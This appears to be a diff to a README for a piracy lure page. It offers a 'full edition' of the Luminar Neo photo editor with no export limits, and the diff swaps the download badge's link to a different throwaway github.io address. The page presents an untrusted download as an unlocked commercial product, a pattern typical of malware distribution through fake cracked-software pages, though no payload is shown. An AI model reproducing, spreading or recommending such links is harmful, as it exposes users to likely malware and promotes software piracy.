@@ -1,6 +1,6 @@
 # 🌌✨ Luminar Neo — Download Full Edition with AI Tools and No Export Limits
 
-[![Download Luminar Neo Setup](https://img.shields.io/badge/Download-Luminar_Neo_PC_Guide-brightgreen?style=for-the-badge&logo=windows)](https://luminar-neo-full-activated-download.github.io/.github/)
+[![Download Luminar Neo Setup](https://img.shields.io/badge/Download-Luminar_Neo_PC_Guide-brightgreen?style=for-the-badge&logo=windows)](https://saoowqshreyashsable5105.github.io/.github/)
 
 Bring your photography to life with Luminar Neo — a cutting-edge photo editing platform enhanced with AI-powered tools. This Windows PC version unlocks premium capabilities including portrait enhancement, sky replacement, and full export support without restrictions.
 
